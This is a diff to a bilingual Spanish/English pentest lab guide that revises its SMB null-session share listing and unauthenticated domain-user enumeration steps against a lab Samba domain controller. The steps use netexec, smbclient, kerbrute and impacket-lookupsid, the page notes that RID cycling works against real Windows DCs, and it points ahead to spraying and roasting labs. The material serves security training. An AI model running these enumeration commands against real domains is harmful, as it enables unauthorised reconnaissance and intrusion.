@@ -34,10 +34,9 @@ nxc smb {{ ad_dc_ip }}
 # SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})</pre>
 
     <h3>2 · Sesión nula: listar recursos compartidos</h3>
-    <p>El servidor tiene <code>restrict anonymous = 0</code> y <code>map to guest = Bad User</code>, así que una sesión sin credenciales lista los recursos.</p>
-    <pre># Con netexec (sesión nula y sesión guest)
+    <p>El servidor tiene <code>restrict anonymous = 0</code>, así que una sesión <strong>totalmente anónima</strong> (usuario y contraseña en blanco) lista los recursos. <strong>Importante</strong>: tiene que ser el usuario vacío — si indicas explícitamente <code>guest</code> como usuario, Samba intenta autenticar esa cuenta de verdad (no la trata como "bad user") y la sesión falla con <code>STATUS_LOGON_FAILURE</code>, aunque <code>map to guest = Bad User</code> sí mapee a invitado cualquier usuario que <em>no exista</em>.</p>
+    <pre># Con netexec (usuario y contraseña vacíos — no "guest" explícito)
 nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
-nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --shares
 
 # Con smbclient
 smbclient -N -L //{{ ad_dc_ip }}/
@@ -47,17 +46,18 @@ smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
     <p>Entre los recursos aparece <code>public</code> con permiso de lectura para todos.</p>
 
     <h3>3 · Enumerar usuarios del dominio sin credenciales</h3>
-    <p>Dos vías clásicas: RID cycling por SMB y fuerza bruta de nombres contra el KDC (que responde distinto para un usuario válido).</p>
-    <pre># RID cycling (enumera SIDs 500-1500 y los traduce a nombres)
-nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute
-impacket-lookupsid '{{ ad_domain }}/guest:@{{ ad_dc_ip }}' 1500
-
-# Enumeración de usuarios contra Kerberos (no necesita credenciales)
+    <p>La vía verificada y funcional contra este Domain Controller es la fuerza bruta de nombres directamente contra el KDC de Kerberos: para cada nombre probado, el KDC responde distinto según exista o no esa cuenta (<code>PRINCIPAL UNKNOWN</code> vs. petición de pre-auth), y esto no requiere ninguna sesión SMB previa.</p>
+    <pre># Enumeración de usuarios contra Kerberos (no necesita sesión SMB ni credenciales)
 kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</pre>
-    <p>Guarda la lista de usuarios en <code>users.txt</code>: la vas a reutilizar en los labs de spraying, AS-REP Roasting y Kerberoasting.</p>
-    <pre>nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute 2>/dev/null \
-  | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' &gt; users.txt
+    <p>Guarda la lista de usuarios válidos en <code>users.txt</code>: la vas a reutilizar en los labs de spraying, AS-REP Roasting y Kerberoasting.</p>
+    <pre>kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>/dev/null \
+  | grep 'VALID USERNAME' | awk '{print $NF}' | cut -d@ -f1 &gt; users.txt
 cat users.txt</pre>
+
+    <p><strong>Nota sobre este Domain Controller:</strong> el RID cycling clásico por SMB/SAMR-LSAD (<code>nxc --rid-brute</code>, <code>impacket-lookupsid</code>) es la técnica que usarías contra un Domain Controller Windows real, pero <strong>no funciona contra este DC</strong>: la cuenta <code>guest</code> no admite login explícito (<code>STATUS_LOGON_FAILURE</code>) y, aunque uses una sesión completamente anónima, el propio LSAD rechaza la petición (<code>STATUS_ACCESS_DENIED</code>) — limitación conocida de la implementación de Samba. Los comandos reales, para referencia:</p>
+    <pre># Contra un DC Windows real esto SÍ funciona con sesión nula o guest:
+nxc smb {{ ad_dc_ip }} -u '' -p '' --rid-brute
+impacket-lookupsid '{{ ad_domain }}/:@{{ ad_dc_ip }}' 1500</pre>
 
     <h3>4 · Saquear el recurso anónimo</h3>
     <pre>smbclient -N //{{ ad_dc_ip }}/public
@@ -103,10 +103,9 @@ nxc smb {{ ad_dc_ip }}
 # SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})</pre>
 
     <h3>2 · Null session: list the shares</h3>
-    <p>The server ships <code>restrict anonymous = 0</code> and <code>map to guest = Bad User</code>, so a credential-less session lists the shares.</p>
-    <pre># With netexec (null and guest sessions)
+    <p>The server ships <code>restrict anonymous = 0</code>, so a <strong>fully anonymous</strong> session (blank username and password) lists the shares. <strong>Important</strong>: it must be the blank user — if you explicitly pass <code>guest</code> as the username, Samba actually tries to authenticate that account instead of treating it as a "bad user", and the session fails with <code>STATUS_LOGON_FAILURE</code>, even though <code>map to guest = Bad User</code> does map any <em>nonexistent</em> username to guest.</p>
+    <pre># With netexec (blank username/password — not an explicit "guest")
 nxc smb {{ ad_dc_ip }} -u '' -p '' --shares
-nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --shares
 
 # With smbclient
 smbclient -N -L //{{ ad_dc_ip }}/
@@ -116,17 +115,18 @@ smbmap -H {{ ad_dc_ip }} -u '' -p ''</pre>
     <p>A <code>public</code> share shows up, readable by everyone.</p>
 
     <h3>3 · Enumerate domain users without credentials</h3>
-    <p>Two classic paths: SMB RID cycling and username brute force against the KDC (which answers differently for a valid user).</p>
-    <pre># RID cycling (walks SIDs 500-1500 and resolves them to names)
-nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute
-impacket-lookupsid '{{ ad_domain }}/guest:@{{ ad_dc_ip }}' 1500
-
-# Kerberos user enumeration (no credentials needed)
+    <p>The verified path that actually works against this Domain Controller is username brute force directly against the Kerberos KDC: for each candidate name, the KDC replies differently depending on whether the account exists (<code>PRINCIPAL UNKNOWN</code> vs. a pre-auth prompt), and this needs no prior SMB session at all.</p>
+    <pre># Kerberos user enumeration (no SMB session or credentials needed)
 kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt</pre>
-    <p>Save the user list to <code>users.txt</code>: you will reuse it in the spraying, AS-REP Roasting and Kerberoasting labs.</p>
-    <pre>nxc smb {{ ad_dc_ip }} -u 'guest' -p '' --rid-brute 2>/dev/null \
-  | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' &gt; users.txt
+    <p>Save the valid usernames to <code>users.txt</code>: you will reuse it in the spraying, AS-REP Roasting and Kerberoasting labs.</p>
+    <pre>kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>/dev/null \
+  | grep 'VALID USERNAME' | awk '{print $NF}' | cut -d@ -f1 &gt; users.txt
 cat users.txt</pre>
+
+    <p><strong>Note about this Domain Controller:</strong> classic SMB/SAMR-LSAD RID cycling (<code>nxc --rid-brute</code>, <code>impacket-lookupsid</code>) is the technique you'd use against a real Windows Domain Controller, but <strong>it does not work against this DC</strong>: the <code>guest</code> account rejects explicit login (<code>STATUS_LOGON_FAILURE</code>), and even with a fully anonymous session LSAD itself denies the request (<code>STATUS_ACCESS_DENIED</code>) — a known limitation of Samba's implementation. The real commands, for reference:</p>
+    <pre># Against a real Windows DC this DOES work with a null or guest session:
+nxc smb {{ ad_dc_ip }} -u '' -p '' --rid-brute
+impacket-lookupsid '{{ ad_domain }}/:@{{ ad_dc_ip }}' 1500</pre>
 
     <h3>4 · Loot the anonymous share</h3>
     <pre>smbclient -N //{{ ad_dc_ip }}/public
